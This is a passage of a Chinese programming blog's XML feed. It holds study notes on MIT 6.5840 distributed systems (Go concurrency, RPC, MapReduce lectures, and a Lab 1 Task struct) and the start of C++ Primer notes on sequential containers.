当从cond.Wait()返回时将再次获得锁</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> count &gt;= <span class="number">5</span> &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">&quot;received 5+ votes!&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">&quot;lost&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">mu.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一个使用channels不够好的例子">一个使用channels不够好的例子</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">rand.Seed(time.Now().UnixNano())</span><br><span class="line"></span><br><span class="line">count := <span class="number">0</span></span><br><span class="line">finished := <span class="number">0</span></span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch &lt;- requestVote()</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> count &lt; <span class="number">5</span> &amp;&amp; finished &lt; <span class="number">10</span> &#123;</span><br><span class="line">v := &lt;-ch</span><br><span class="line"><span class="keyword">if</span> v &#123;</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">finished += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> count &gt;= <span class="number">5</span> &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">&quot;received 5+ votes!&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">&quot;lost&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题在于：如果前5个人投了赞成票，剩下的线程就会被阻塞</p><h3 id="改进">改进</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">v := &lt;-ch</span><br><span class="line"><span class="keyword">if</span> v &#123;</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="Remote-Procedure-Call-RPC">Remote Procedure Call (RPC)</h1><ul><li>Goal: RPC behaves as local procedure</li><li>hide details of network protocols</li><li>convert data (strings, arrays, maps, &amp;c) to “wire format”</li><li>portability(可移植性, 便携性) / interoperability(互通性,  互操作性)</li><li>Software structure<br>client app        handler fns(fns是啥)<br>stub fns         dispatcher<br>RPC lib           RPC lib<br>net  ------------ net</li></ul><h2 id="Go-example-kv-go-on-schedule-page">Go example: kv.go on schedule page</h2><p>A toy key/value storage server – Put(key,value), Get(key)-&gt;value<br>Uses Go’s RPC library</p><h3 id="Common">Common:</h3><p>Declare Args and Reply struct for each server handler.</p><h3 id="Client">Client:</h3><ul><li><code>connect()</code>'s Dial() creates a TCP connection to the server</li><li>get() and put() are client “<code>stubs</code>”</li><li><code>Call()</code> asks the RPC library to perform the call<ul><li>you specify server function name, arguments, place to put reply</li><li>library marshalls args, sends request, waits, unmarshalls reply</li><li>return value from Call() indicates whether it got a reply</li><li>usually you’ll also have a reply.Err indicating service-level failure</li></ul></li></ul><h3 id="Server">Server:</h3><ul><li><p>Go requires server to declare an object with methods as RPC handlers<br>Server then <strong>register</strong>s that object with the RPC library</p></li><li><p>Server accepts TCP connections, gives them to RPC library</p></li><li><p>The RPC library</p><ul><li>reads each request</li><li>creates a new goroutine for this request</li><li>unmarshalls request</li><li>looks up the named object (in table create by Register())</li><li>calls the object’s named method (dispatch)</li><li>marshalls reply</li><li>writes reply on TCP connection</li></ul></li><li><p>The server’s Get() and Put() handlers</p><ul><li><p>Must lock, since RPC library creates a new goroutine for each request</p><blockquote><p>访问/修改相关状态时必须加锁？</p></blockquote></li><li><p>read args; modify reply</p></li><li><p>Note: state-oriented implementation</p></li></ul></li></ul><h3 id="A-few-details">A few details:</h3><ul><li><p>Binding: how does client know what server computer to talk to?</p><ul><li>For Go’s RPC, server name/port is an argument to Dial</li><li>Big systems have some kind of name or configuration server</li></ul></li><li><p>Marshalling: format data into packets</p><ul><li><p>Go’s RPC library can pass strings, arrays, objects, maps, &amp;c  // &amp;c是啥</p></li><li><p>Go passes pointers by copying the pointed-to data</p></li><li><p>Cannot pass channels or functions</p></li><li><p>Marshals only exported field (i.e., ones w CAPITAL letter)</p><blockquote><p>w 是 with 的简写</p></blockquote></li></ul></li></ul><h2 id="Simplest-failure-handling-scheme-“best-effort-RPC”">Simplest failure-handling scheme: “best-effort RPC”</h2><ul><li>Call() waits for response for a while</li><li>If none arrives, re-send the request</li><li>Do this a few times</li><li>Then give up and return an error</li></ul><h2 id="Better-RPC-behavior-“at-most-once-RPC”">Better RPC behavior: “at-most-once RPC”</h2><ul><li>client re-sends if no answer;</li><li>server RPC code detects duplicate requests,</li><li>returns previous reply instead of re-running handler</li></ul><h3 id="Q-how-to-detect-a-duplicate-request">Q: how to detect a duplicate request?</h3><ul><li>client includes unique ID (XID) with each request<br>uses same XID for re-send</li><li>server:<br>if seen[xid]:<br>r = old[xid]<br>else<br>r = handler()<br>old[xid] = r<br>seen[xid] = true</li></ul><h3 id="some-at-most-once-complexities">some at-most-once complexities</h3><ul><li>this will come up in lab 3</li><li>what if two clients use the same XID?<br>big random number?</li><li>how to avoid a huge seen[xid] table?<br>idea:<br>each client has a unique ID (perhaps a big random number)<br>per-client RPC sequence numbers<br>client includes “seen all replies &lt;= X” with every RPC<br>much like TCP sequence #s and acks<br>then server can keep O(# clients) state, rather than O(# XIDs)</li><li>server must eventually discard info about old RPCs or old clients<br>when is discard safe?</li><li>how to handle dup req while original is still executing?<br>server doesn’t know reply yet<br>idea: “pending” flag per executing RPC; wait or ignore</li></ul><blockquote><p>还不清楚，等lab3再看呗</p></blockquote><h2 id="Go-RPC-is-a-simple-form-of-“at-most-once”"># Go RPC is a simple form of “at-most-once”</h2><ul><li>open TCP connection</li><li>write request to TCP connection</li><li>Go RPC never re-sends a request<br>So server won’t see duplicate requests</li><li>Go RPC code returns an error if it doesn’t get a reply</li><li>perhaps after a timeout (from TCP)</li><li>perhaps server didn’t see request</li><li>perhaps server processed requesbut server/net failed before reply came back</li></ul>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> MIT6.5840 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式系统 </tag>
            
            <tag> MIT6.5840讲义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.5840 2023 Lecture 1 Introduction</title>
      <link href="/2023/09/28/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-1-Introduction/"/>
      <url>/2023/09/28/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-1-Introduction/</url>
      
        <content type="html"><![CDATA[<blockquote><p>课程网址：<a href="https://pdos.csail.mit.edu/6.824/schedule.html">https://pdos.csail.mit.edu/6.824/schedule.html</a><br>以下内容来自课程课件，由于课件纯文本显示效果不佳，故对其排版整理并添加了部分个人笔记批注。</p></blockquote><h1 id="6-5840-Distributed-Systems-Engineering">6.5840: Distributed Systems Engineering</h1><h2 id="What-I-mean-by-“distributed-system”">What I mean by “distributed system”:</h2><ul><li>a group of computers cooperating to provide a service<br>this class is mostly about infrastructure services<br>e.g. storage for big web sites, MapReduce, peer-to-peer sharing</li><li>lots of important infrastructure is distributed</li></ul><h2 id="Why-do-people-build-distributed-systems">Why do people build distributed systems?</h2><ul><li>to increase <strong>capacity</strong> via parallel processing</li><li>to <strong>tolerate faults</strong> via replication</li><li>to <strong>match distribution</strong> of physical devices e.g. sensors</li><li>to increase <strong>security</strong> via isolation</li></ul><h2 id="But-it’s-not-easy">But it’s not easy:</h2><ul><li>concurrency</li><li>complex interactions</li><li>partial failure</li><li>hard to get high performance</li></ul><h2 id="Why-study-this-topic">Why study this topic?</h2><ul><li>interesting – hard problems, powerful solutions</li><li>widely used – driven by the rise of big Web sites</li><li>active research area – important unsolved problems</li><li>challenging to build – you’ll do it in the labs</li></ul><hr><h1 id="COURSE-STRUCTURE">COURSE STRUCTURE</h1><h2 id="Course-components">Course components:</h2><p>lectures、papers、two exams、labs、final project (optional)</p><h3 id="Lectures">Lectures:</h3><p>big ideas, paper discussion, lab guidance<br>will be recorded, available online</p><h3 id="Papers">Papers:</h3><p>there’s a paper assigned for almost every lecture<br>research papers, some classic, some new<br>problems, ideas, implementation details, evaluation<br>please read papers before class!<br>web site has a short question for you to answer about each paper<br>and we ask you to send us a question you have about the paper<br>submit answer and question before start of lecture</p><h3 id="Exams">Exams:</h3><p>Mid-term exam in class<br>Final exam during finals week<br>Mostly about papers and labs</p><h3 id="Labs">Labs:</h3><p>goal: deeper understanding of some important ideas<br>goal: experience with distributed programming<br>first lab is due a week from Friday<br>one per week after that for a while</p><blockquote><p>Lab 1: distributed big-data framework (like MapReduce)<br>Lab 2: fault tolerance using replication (Raft)<br>Lab 3: a simple fault-tolerant database<br>Lab 4: scalable database performance via sharding</p></blockquote><h3 id="Optional-final-project-at-the-end-in-groups-of-2-or-3">Optional final project at the end, in groups of 2 or 3.</h3><p>The final project substitutes for Lab 4.<br>You think of a project and clear it with us.<br>Code, short write-up, demo on last day.</p><hr><h1 id="MAIN-TOPICS">MAIN TOPICS</h1><h2 id="This-is-a-course-about-infrastructure-for-applications">This is a course about infrastructure for applications.</h2><ul><li><p>Storage.</p></li><li><p>Communication.</p></li><li><p>Computation.</p></li></ul><blockquote><p>A big goal: hide the complexity of distribution from applications.</p></blockquote><h3 id="Topic-fault-tolerance">Topic: fault tolerance</h3><ul><li>1000s of servers, big network -&gt; always something broken<br>We’d like to hide these failures from the application.<br>“High availability”: service continues despite failures</li><li>Big idea: <strong>replicated servers</strong>.<br>If one server crashes, can proceed using the other(s).<br>Labs 2 and 3</li></ul><h2 id="Topic-consistency">Topic: consistency</h2><ul><li>General-purpose infrastructure needs well-defined behavior.<br>E.g. “Get(key) yields the value from the most recent Put(key,value).”</li><li>Achieving good behavior is hard!<br>e.g. “Replica” servers are hard to keep identical.</li></ul><h2 id="Topic-performance">Topic: performance</h2><ul><li>The goal: scalable throughput<br>Nx servers -&gt; Nx total throughput via parallel CPU, RAM, disk, net.</li><li>Scaling gets harder as N grows:<br>Load imbalance.<br>Slowest-of-N latency.<br>Some things don’t speed up with N: initialization, interaction.<br>Labs 1, 4</li></ul><h2 id="Topic-tradeoffs">Topic: tradeoffs</h2><ul><li><strong>Fault-tolerance, consistency, and performance are enemies.</strong><br>Fault tolerance and consistency require communication<br>e.g., send data to backup server<br>e.g., check if cached data is up-to-date<br>communication is often slow and non-scalable</li><li>Many designs provide only weak consistency, to gain speed.<br>e.g. Get() might <em>not</em> yield the latest Put()!<br>Painful for application programmers but may be a good trade-off.<br>We’ll see many design points in the consistency/performance spectrum.</li></ul><h2 id="Topic-implementation">Topic: implementation</h2><p>RPC, threads, concurrency control, configuration.<br>The labs…</p><hr><h1 id="CASE-STUDY-MapReduce">CASE STUDY: MapReduce</h1><h2 id="Let’s-talk-about-MapReduce-MR">Let’s talk about MapReduce (MR)</h2><ul><li>a good illustration of 6.5840’s main topics</li><li>hugely influential</li><li>the focus of Lab 1</li></ul><h2 id="MapReduce-overview">MapReduce overview</h2><ul><li>context: multi-hour computations on multi-terabyte data-sets<br>e.g. build search index, or sort, or analyze structure of web<br>only practical with 1000s of computers<br>applications not written by distributed systems experts</li><li>big goal: easy for non-specialist programmers<br>programmer just defines Map and Reduce functions<br>often fairly simple sequential code</li><li>MR manages, and hides, all aspects of distribution!</li></ul><blockquote><p>multi-hour是什么意思？<br>MapReduce不适合1000以上规模的集群吗？</p></blockquote><h2 id="Abstract-view-of-a-MapReduce-job-–-word-count">Abstract view of a MapReduce job – word count</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input1 -&gt; Map -&gt; a,1 b,1</span><br><span class="line">Input2 -&gt; Map -&gt;     b,1</span><br><span class="line">Input3 -&gt; Map -&gt; a,1     c,1</span><br><span class="line">                  |   |   |</span><br><span class="line">                  |   |   -&gt; Reduce -&gt; c,1</span><br><span class="line">                  |   -----&gt; Reduce -&gt; b,2</span><br><span class="line">                  ---------&gt; Reduce -&gt; a,2</span><br></pre></td></tr></table></figure><ol><li>input is (already) split into M files</li><li>MR calls Map() for each input file, produces list of k,v pairs<br>“intermediate” data<br>each Map() call is a “task”</li><li>when Maps are done,<br>MR gathers all intermediate v’s for each k,<br>and passes each key + values to a Reduce call</li><li>final output is set of &lt;k,v&gt; pairs from Reduce()s</li></ol><h2 id="Word-count-specific-code">Word-count-specific code</h2><ul><li>Map(k, v)<br>split v into words<br>for each word w<br>emit(w, “1”)</li><li>Reduce(k, v_list)<br>emit(len(v_list))</li></ul><h2 id="MapReduce-scales-well">MapReduce scales well:</h2><ul><li>N “worker” computers (might) get you Nx throughput.<br>Maps()s can run in parallel, since they don’t interact.<br>Same for Reduce()s.</li><li>Thus more computers -&gt; more throughput – very nice!</li></ul><h2 id="MapReduce-hides-many-details">MapReduce hides many details:</h2><ul><li>sending app code to servers</li><li>tracking which tasks have finished</li><li>“shuffling” intermediate data from Maps to Reduces</li><li>balancing load over servers</li><li>recovering from failures</li></ul><h2 id="However-MapReduce-limits-what-apps-can-do">However, MapReduce limits what apps can do:</h2><ol><li><strong>No interaction or state (other than via intermediate output).</strong></li><li><strong>No iteration</strong></li><li><strong>No real-time or streaming processing.</strong></li></ol><hr><h1 id="Some-details-paper’s-Figure-1">Some details (paper’s Figure 1)</h1><p><img src="/2023/09/28/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-1-Introduction/image-20230929104728326.png" alt></p><h2 id="Input-and-output-are-stored-on-the-GFS-cluster-file-system">Input and output are stored on the GFS cluster file system</h2><ul><li>MR needs huge parallel input and output throughput.</li><li>GFS splits files over many servers, in 64 MB chunks<br>Maps read in parallel<br>Reduces write in parallel</li><li>GFS also replicates each file on 2 or 3 servers</li><li>GFS is a big win for MapReduce</li></ul><h2 id="The-“Coordinator”-manages-all-the-steps-in-a-job">The “Coordinator” manages all the steps in a job.</h2><ol><li>coordinator gives Map tasks to workers until all Maps complete<br>Maps write output (intermediate data) to local disk<br>Maps split output, by hash(key) mod R, into one file per Reduce task</li><li>after all Maps have finished, coordinator hands out Reduce tasks<br>each Reduce task corresponds to one hash bucket of intermediate output<br>each Reduce fetches its intermediate output from (all) Map workers<br>each Reduce task writes a separate output file on GFS</li></ol><h2 id="What-will-likely-limit-the-performance">What will likely limit the performance?</h2><p>We care since that’s the thing to optimize.</p><p>CPU? memory? disk? network?</p><ul><li>In 2004 authors were limited by network capacity.<br>What does MR send over the network?<br>Maps read input from GFS.<br>Reduces read Map intermediate output.<br>Often as large as input, e.g. for sorting.<br>Reduces write output files to GFS.<br>[diagram: servers, tree of network switches]</li><li>In MR’s all-to-all shuffle, half of traffic goes through root switch.<br>Paper’s root switch: 100 to 200 gigabits/second, total<br>1800 machines, so 55 megabits/second/machine.<br>55 is small:  much less than disk or RAM speed.</li></ul><h2 id="How-does-MR-minimize-network-use">How does MR minimize network use?</h2><ol><li><strong>Coordinator tries to run each Map task on GFS server that stores its input.</strong><br>All computers run both GFS and MR workers<br>So input is read from local disk (via GFS), not over network.</li><li><strong>Intermediate data goes over network just once.</strong><br>Map worker writes to local disk.<br>Reduce workers read from Map worker disks over the network.<br>Storing it in GFS would require at least two trips over the network.</li><li><strong>Intermediate data partitioned into files holding many keys.</strong><br>R is much smaller than the number of keys.<br>Big network transfers are more efficient.</li></ol><h2 id="How-does-MR-get-good-load-balance">How does MR get good load balance?</h2><ul><li>Wasteful and slow if N-1 servers have to wait for 1 slow server to finish.</li><li>But some tasks likely take longer than others.</li><li>Solution: <strong>many more tasks than worker machines.</strong><br>Coordinator hands out new tasks to workers who finish previous tasks.<br>No task is so big it dominates completion time (hopefully).<br>So faster servers do more tasks than slower ones,<br>And all finish at about the same time.</li></ul><h2 id="What-about-fault-tolerance">What about fault tolerance?</h2><p>What if a worker crashes during a MR job?<br>We want to hide failures from the application programmer!<br>Does MR have to re-run the whole job from the beginning?<br>Why not?<br><strong>MR re-runs just the failed Map()s and Reduce()s.</strong></p><h2 id="Suppose-MR-runs-a-Map-twice-one-Reduce-sees-first-run’s-output-but-another-Reduce-sees-the-second-run’s-output">Suppose MR runs a Map twice, one Reduce sees first run’s output, but another Reduce sees the second run’s output?</h2><p>Could the two Reduces produce inconsistent results?</p><ul><li>No: <strong>Map() must produce exactly the same result if run twice with same input</strong>.<br>And Reduce() too.</li><li>So Map and Reduce must be <strong>pure deterministic functions</strong>:<br>they are only allowed to look at their arguments/input.<br>no state, no file I/O, no interaction, no external communication.</li></ul><h2 id="Details-of-worker-crash-recovery">Details of worker crash recovery:</h2><ul><li>a Map worker crashes:<br>coordinator notices worker no longer responds to pings<br>coordinator knows which Map tasks ran on that worker<br><strong>those tasks’ intermediate output is now lost, must be re-created</strong><br>coordinator tells other workers to run those tasks<br><strong>can omit re-running if all Reduces have fetched the intermediate data</strong></li><li>a Reduce worker crashes:<br><strong>finished tasks are OK – stored in GFS, with replicas.</strong><br><strong>coordinator re-starts worker’s unfinished tasks on other workers.</strong></li></ul><h2 id="Other-failures-problems">Other failures/problems:</h2><ul><li>What if the coordinator gives two workers the same Map() task?<br>perhaps the coordinator incorrectly thinks one worker died.<br>it will tell Reduce workers about only one of them.</li><li>What if the coordinator gives two workers the same Reduce() task?<br>they will both try to write the same output file on GFS!<br>atomic GFS rename prevents mixing; one complete file will be visible.</li><li>What if a single worker is very slow – a “straggler”?<br>perhaps due to flakey hardware.<br>coordinator starts a second copy of last few tasks.</li><li>What if a worker computes incorrect output, due to broken h/w or s/w?<br>too bad! MR assumes “fail-stop” CPUs and software.</li><li>What if the coordinator crashes?</li></ul><blockquote><p>正常情况下，coordinator（master）就不会给两个workers相同的Map()任务吗？<br>只有超时时才会把该任务分发给新worker吗？</p><p>flakey(易出故障的；不可靠的(等于 flaky)</p><p>h/w or s/w 是什么？</p></blockquote><h2 id="Current-status">Current status?</h2><p>Hugely influential (Hadoop, Spark, &amp;c).<br>Probably no longer in use at Google.<br>Replaced by Flume / FlumeJava (see paper by Chambers et al).<br>GFS replaced by Colossus (no good description), and BigTable.</p><hr><h1 id="Conclusion">Conclusion</h1><p>MapReduce made big cluster computation popular.</p><ul><li>-Not the most efficient or flexible.</li></ul><ul><li>+Scales well.</li><li>+Easy to program – failures and data movement are hidden.</li></ul><p>These were good trade-offs in practice.</p><p>We’ll see some more advanced successors later in the course.<br>Have fun with Lab 1!</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> MIT6.5840 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式系统 </tag>
            
            <tag> MIT6.5840讲义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lab 1 MapReduce</title>
      <link href="/2023/09/28/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lab-1-MapReduce/"/>
      <url>/2023/09/28/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lab-1-MapReduce/</url>
      
        <content type="html"><![CDATA[<h1 id="资料">资料</h1><ul><li>论文： <a href="https://pdos.csail.mit.edu/6.824/papers/mapreduce.pdf">MapReduce (2004)</a></li><li>实验要求：<a href="https://pdos.csail.mit.edu/6.824/labs/lab-mr.html">Lab 1: MapReduce</a></li></ul><blockquote><p>课程相关，建议看掉 Lecture 1 和 Lecture2，也就是 <a href="https://www.bilibili.com/video/BV16f4y1z7kn/">B 站课程</a>的 P1 和 P2。了解一下 MapReduce 的基本概念，以及 Golang 并发编程和 RPC 的演示。</p><p>在 Lecture6，也就是 B 站课程的 P6 中，有这次 Lab 的相关 Q&amp;A，可以小小的借鉴一下。</p><p>按理来说不应该寻找解析博客，但既然搜到本篇博客了，这里就推荐一篇解析详细的博客：<a href="https://blog.rayzhang.top/2022/10/29/mit-6.824-lab1-mapreduce/index.html">MIT 6.824 Lab 1: MapReduce 实验</a>。<br>本篇博客基于上述博客，内容更精简，包含了自己一些的踩坑历程。</p></blockquote><h1 id="任务-task-go">任务: task.go</h1><p>CO (coordinator) 和 C (Client) 都需要使用到Task，有必要定义相同的Task数据结构。</p><p>二者RPC通信使用Task，为了减少流量，提高吞吐量(throughput)应当减少Task类的大小，仅仅应当包含二者都必须的内容，不应该包含仅仅需要单方维护的信息。Task是系统框架分配资源的最小单元。</p><p>Task包含的字段包括：</p><ul><li>TaskType</li><li>TaskId: 本文的设计是不同Type的Task的Id可以是相同的</li><li>ReduceTaskNum</li><li>File 每个Map任务对应一个文件，每个Reduce可能对应多个文件。</li></ul><p>这里本文讲Task类放在一个新的文件中，也可以</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TaskType <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MapTask TaskType = <span class="literal">iota</span></span><br><span class="line">ReduceTask</span><br><span class="line">ExitTask</span><br><span class="line">WaitTask</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Task <span class="keyword">struct</span> &#123;</span><br><span class="line">Type           TaskType</span><br><span class="line">TaskId         <span class="type">int</span></span><br><span class="line">ReducerTaskNum <span class="type">int</span></span><br><span class="line">Files          []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTask</span><span class="params">(taskType TaskType, taskId <span class="type">int</span>, nReduce <span class="type">int</span>, files []<span class="type">string</span>)</span></span> *Task &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;Task&#123;</span><br><span class="line">Type:           taskType,</span><br><span class="line">TaskId:         taskId,</span><br><span class="line">ReducerTaskNum: nReduce,</span><br><span class="line">Files:          files,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><ul><li>所有Map完成后再开始Reduce任务。</li><li>创建channel时需要指定缓冲区大小，否则当写入第一个数据后在写入第二个数据时就会阻塞。</li><li>另外由于文件系统的特性，当我们使用 <code>os.Rename</code> 覆盖一个文件时，如果被覆盖的文件被打开正在读写，那读写操作不会受影响，只有 inode 和文件名之间发生了 unlink，inode 在文件关闭后才会回收，因此不用担心某个 <code>map</code> 任务运行由于过于缓慢被认定失败但是在 <code>reduce</code> 运行到某个阶段再次覆盖了中间文件。</li><li>const 内的 iota是golang语言的常量计数器,只能在常量的表达式中使用，，即const内。<br>iota在const关键字出现时将被重置为0(const内部的第一行之前)，const中每新增一行常量声明将使iota计数一次。</li><li>当刚被创建出来的时候，这个任务是处于在等待状态的，由于还没有开始运行，因此时间戳也暂时无需设置，直到这个任务从队列中被取出我们才需要进行设置。</li><li>type ByKey []KeyValue 必须要这样写吗</li></ul>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> MIT6.5840 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第9章 顺序容器</title>
      <link href="/2023/09/10/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch09/"/>
      <url>/2023/09/10/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch09/</url>
      
        <content type="html"><![CDATA[<h2 id="顺序容器概述">顺序容器概述</h2><ul><li><strong>顺序容器</strong>（sequential container）：为程序员提供了控制元素存储和访问顺序的能力。这种顺序不依赖于元素的值，而是与元素加入容器时的位置相对应。</li></ul><h3 id="顺序容器类型">顺序容器类型</h3><table><thead><tr><th>容器类型</th><th>介绍</th></tr></thead><tbody><tr><td><code>vector</code></td><td>可变大小数组。支持快速随机访问。在尾部之外的位置插入或删除元素可能很慢。</td></tr><tr><td><code>deque</code></td><td>双端队列。支持快速随机访问。在头尾位置插入/删除速度很快。</td></tr><tr><td><code>list</code></td><td>双向链表。只支持双向顺序访问。在<code>list</code>中任何位置进行插入/删除操作速度都很快。</td></tr><tr><td><code>forward_list</code></td><td>单向链表。只支持单向顺序访问。在链表任何位置进行插入/删除操作速度都很快。</td></tr><tr><td><code>array</code></td><td>固定大小数组。支持快速随机访问。不能添加或者删除元素。</td></tr><tr><td><code>string</code></td><td>与<code>vector</code>相似的容器，但专门用于保存字符。随机访问块。在尾部插入/删除速度快。</td></tr></tbody></table><ul><li>除了固定大小的<code>array</code>外，其他容器都提供高效、灵活的内存管理。</li><li><code>forward_list</code>和<code>array</code>是新C++标准增加的类型，没有<code>size()</code>方法</li><li>通常使用<code>vector</code>是最好的选择，除非你有很好的理由选择其他容器。</li><li>新标准库的容器比旧版的快得多。</li></ul><h2 id="容器操作">容器操作</h2><h3 id="类型">类型</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>iterator</code></td><td>此容器类型的迭代器类型</td></tr><tr><td><code>const_iterator</code></td><td>可以读取元素但不能修改元素的迭代器类型</td></tr><tr><td><code>size_type</code></td><td>无符号整数类型，足够保存此种容器类型最大可能的大小</td></tr><tr><td><code>difference_type</code></td><td>带符号整数类型，足够保存两个迭代器之间的距离</td></tr><tr><td><code>value_type</code></td><td>元素类型</td></tr><tr><td><code>reference</code></td><td>元素的左值类型；和<code>value_type &amp;</code>含义相同</td></tr><tr><td><code>const_reference</code></td><td>元素的<code>const</code>左值类型，即<code>const value_type &amp;</code></td></tr></tbody></table><h3 id="构造函数">构造函数</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>C c;</code></td><td>默认构造函数，构造空容器</td></tr><tr><td><code>C c1(c2);</code>或<code>C c1 = c2;</code></td><td>构造<code>c2</code>的拷贝<code>c1</code></td></tr><tr><td><code>C c(b, e)</code></td><td>构造<code>c</code>，将迭代器<code>b</code>和<code>e</code>指定范围内的所有元素拷贝到<code>c</code></td></tr><tr><td><code>C c(a, b, c...)</code></td><td>列表初始化<code>c</code></td></tr><tr><td><code>C c(n)</code></td><td>只支持顺序容器，且不包括<code>array</code>，包含<code>n</code>个元素，这些元素进行了值初始化</td></tr><tr><td><code>C c(n, t)</code></td><td>包含<code>n</code>个初始值为<code>t</code>的元素</td></tr></tbody></table><ul><li>只有顺序容器的构造函数才接受大小参数，关联容器并不支持。</li><li><code>array</code>具有固定大小。</li><li>和其他容器不同，默认构造的<code>array</code>是非空的。</li><li>直接复制：将一个容器复制给另一个容器时，类型必须匹配：容器类型和元素类型都必须相同。</li><li>使用迭代器复制：不要求容器类型相同，容器内的元素类型也可以不同。</li></ul><h3 id="赋值和swap">赋值和<code>swap</code></h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c1 = c2;</code></td><td>将<code>c1</code>中的元素替换成<code>c2</code>中的元素</td></tr><tr><td><code>c1 = &#123;a, b, c...&#125;</code></td><td>将<code>c1</code>中的元素替换成列表中的元素（不适用于<code>array</code>）</td></tr><tr><td><code>c1.swap(c2)</code></td><td>交换<code>c1</code>和<code>c2</code>的元素</td></tr><tr><td><code>swap(c1, c2)</code></td><td>等价于<code>c1.swap(c2)</code></td></tr><tr><td><code>c.assign(b, e)</code></td><td>将<code>c</code>中的元素替换成迭代器<code>b</code>和<code>e</code>表示范围中的元素，<code>b</code>和<code>e</code>不能指向<code>c</code>中的元素</td></tr><tr><td><code>c.assign(il)</code></td><td>将<code>c</code>中的元素替换成初始化列表<code>il</code>中的元素</td></tr><tr><td><code>c.assign(n, r)</code></td><td>将<code>c</code>中的元素替换为<code>n</code>个值是<code>t</code>的元素</td></tr></tbody></table><ul><li>使用非成员版本的<code>swap</code>是一个好习惯。</li><li><code>assign</code>操作不适用于关联容器和<code>array</code></li></ul><h3 